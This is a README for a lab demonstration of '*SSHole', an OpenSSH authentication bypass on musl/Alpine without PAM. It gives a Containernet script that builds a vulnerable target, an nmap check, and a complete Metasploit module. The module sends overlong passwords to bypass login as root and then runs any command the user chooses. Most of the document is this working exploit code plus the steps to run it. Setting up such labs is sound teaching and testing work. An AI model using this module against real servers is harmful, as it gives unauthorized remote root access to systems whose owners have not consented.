* **Authors:** Ivyson Lucas & Geraldo Lucas

See in PT-BR [here](./README_pt-BR.md).

# *SSHole Exploit

(see this for a detailed look) [*SSHole](https://sshhole.com/)

*SSHole (CVE-2026-123158) is a critical authentication bypass vulnerability
affecting OpenSSH when running on systems that use musl libc (such as Alpine Linux)
compiled without PAM (Pluggable Authentication Modules).

The vulnerability stems from improper error handling within the system's `crypt()`
function when processing overlong inputs (specifically passwords between 257 and
1024 characters). When an input exceeds the expected length, `crypt()` encounters an
error and incorrectly returns `*` (a disabled/invalid password hash indicator) instead
of failing safely.

In this we'll test this exploit in metasploit.

```python
#!/usr/bin/python

import os
from containernet.net import Containernet
from containernet.cli import CLI
from containernet.term import makeTerm
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase="10.200.0.0/24")
    os.system("sudo xhost +local:docker")
    os.system("export DISPLAY=:{}".format(DISPLAY_ID))
    info(" Creating nodes\n")
    s1 = net.addSwitch("s1", failMode="standalone")
    alice1 = net.addDocker(
        "alice",
        dimage="ivysonnn/sshhole",
        cpu_shares=20,
        volumes=["/tmp/.X11-unix:/tmp/.X11-unix:rw"],
        environment={"DISPLAY": ":{}".format(DISPLAY_ID)},
        mac="00:00:00:00:00:01",
    )
    chuck1 = net.addDocker(
        "chuck",
        dimage="ramonfontes/seguranca",
        cpu_shares=20,
        volumes=["/tmp/.X11-unix:/tmp/.X11-unix:rw"],
        environment={"DISPLAY": ":{}".format(DISPLAY_ID)},
        mac="00:00:00:00:00:02",
    )
    info(" Creating Links\n")
    net.addLink(s1, alice1)
    net.addLink(s1, chuck1)
    info(" Starting network\n")
    net.build()
    s1.start([])
    alice1.cmd("echo '10.200.0.1 alice' > /etc/hosts && /usr/sbin/sshd -D -e &")
    alice1.cmd("echo 'bob i love you' > /love_letter.txt")
    makeTerm(chuck1, cmd="bash")
    info(" Running CLI\n")
    CLI(net)
    info("*** Stopping network\n")
    net.stop()


if __name__ == "__main__":
    setLogLevel("info")
    topology()

```

Running the above code will launch in Alice the Alpine Linux and OpenSSH, both vulnerable to the exploit.

```
chuck# nmap -sV -p 22 10.200.0.1
```

We confirm that Alice is running OpenSSH 10.6 and that's possibly a vulnerable version.
This is because version 10.6 has two distinct releases: 10.6p1(vulnerable) and 10.6p2(fixed).

```ruby
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'
require 'stringio'

class FakeTerminal < StringIO
  def noecho
    yield self
  end
  def echo=(val); end
  def raw; yield self; end
  def tty?; true; end
end

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'OpenSSH *SSHole Authentication Bypass Exploit (CVE-2026-123158)',
        'Description'    => %q{
          This module exploits CVE-2026-123158 (*SSHole), an authentication bypass
          vulnerability in OpenSSH running on musl libc (e.g., Alpine Linux) without PAM,
          caused by incorrect error handling in crypt() for overlong inputs.
          It bypasses authentication via sequential overlong password attempts in the same
          TCP session and executes a custom command retrieved from the datastore.
        },
        'Author'         => [
          'Ivyson Lucas <ivysonlucas27@hotmail.com>',
          'Geraldo Lucas <geraldolucas10@gmail.com>'
        ],
        'License'        => MSF_LICENSE,
        'References'     => [
          ['CVE',  '2026-123158'],
          ['URL',  'https://sshhole.com']
        ],
        'DisclosureDate' => '2026-11-05',
        'Targets'        => [
          [ 'Alpine Linux / Musl Libc Target', { 'Platform' => %w[unix linux], 'Arch' => ARCH_CMD } ]
        ],
        'DefaultAction'  => 'Command'
      )
    )

    register_options([
      Opt::RPORT(22),
      OptString.new('USERNAME',     [true, 'Target username to exploit', 'root']),
      OptString.new('CMD',          [true, 'Command to execute on the target', 'id && uname -a']),
      OptInt.new('PASSWORD_LEN',    [true, 'Length of overlong password to send', 300]),
      OptFloat.new('TIMEOUT',       [true, 'SSH connection timeout in seconds', 10])
    ])
  end

  def open(host, port, _connection_options = nil)
    Rex::Socket::Tcp.create(
      'PeerHost' => host,
      'PeerPort' => port,
      'Proxies'  => datastore['Proxies'],
      'Context'  => { 'Msf' => framework, 'MsfExploit' => self }
    )
  end

  def exploit
    ip          = datastore['RHOSTS']
    username    = datastore['USERNAME']
    pass_length = datastore['PASSWORD_LEN']
    timeout     = datastore['TIMEOUT']
    port        = datastore['RPORT']
    target_cmd  = datastore['CMD']

    unless pass_length.between?(257, 1024)
      fail_with(Failure::BadConfig, "PASSWORD_LEN must be between 257 and 1024 (got #{pass_length})")
    end

    overlong_pass = 'A' * pass_length

    print_status("#{ip}:#{port} - Attempting CVE-2026-123158 authentication bypass for user '#{username}'...")

    ssh = nil
    begin
      orig_stdin = $stdin
      $stdin = FakeTerminal.new("#{overlong_pass}\n#{overlong_pass}\n")

      ssh = Net::SSH.start(
        ip,
        username,
        password:                   overlong_pass,
        port:                       port,
        timeout:                    timeout,
        auth_methods:               ['password'],
        number_of_password_prompts: 2,
        verify_host_key:            :never,
        proxy:                      self
      )

    rescue Net::SSH::AuthenticationFailed
      fail_with(Failure::NoAccess, "#{ip}:#{port} - Authentication failed / Target not vulnerable.")
    rescue Net::SSH::ConnectionTimeout, Errno::ECONNREFUSED, Errno::ETIMEDOUT => e
      fail_with(Failure::Unreachable, "#{ip}:#{port} - Connection error: #{e.message}")
    rescue StandardError => e
      fail_with(Failure::Unknown, "#{ip}:#{port} - Unexpected error: #{e.class} #{e.message}")
    ensure
      $stdin = orig_stdin if defined?(orig_stdin)
    end

    if ssh
      print_good("#{ip}:#{port} - EXPLOIT SUCCESSFUL! Authentication bypassed for '#{username}' (CVE-2026-123158)")

      report_vuln(
        host:        ip,
        port:        port,
        proto:       'tcp',
        name:        'CVE-2026-123158 *SSHole OpenSSH Authentication Bypass',
        info:        "Successfully bypassed authentication as '#{username}' using a #{pass_length}-char password.",
        refs:        references
      )

      print_status("#{ip}:#{port} - Executing command from datastore: '#{target_cmd}'...")

      ssh.open_channel do |channel|
        channel.exec("#{target_cmd}\n") do |ch, success|
          unless success
            print_error("Could not execute command channel.")
            return
          end

          ch.on_data do |c, data|
            print data
            $stdout.flush
          end

          ch.on_extended_data do |c, type, data|
            print data
            $stdout.flush
          end
        end
      end

      ssh.loop
    else
      fail_with(Failure::NotVulnerable, "#{ip}:#{port} - Target not vulnerable.")
    end
  end
end
```
Copy the script above, create a file as `sshhole.rb`, and paste it inside.

```
chuck# nano sshhole.rb

chuck# cp sshhole.rb opt/metasploit-framework/embedded/framework/modules/exploits/linux/ssh/

chuck# msfconsole
```

```
chuck-msf > use exploits/linux/ssh/sshhole

chuck-msf exploit(linux/ssh/sshhole) > set RHOSTS 10.200.0.1

chuck-msf exploit(linux/ssh/sshhole) > set USERNAME root

chuck-msf exploit(linux/ssh/sshhole) > set CMD cat /love_letter.txt

chuck-msf exploit(linux/ssh/sshhole) > exploit
```

If all goes right it will print `bob i love you`.

The CMD option is any linux command you'd like.

When Chuck authenticates he's locatted at `/home/alice`, have that in mind when using different commands.
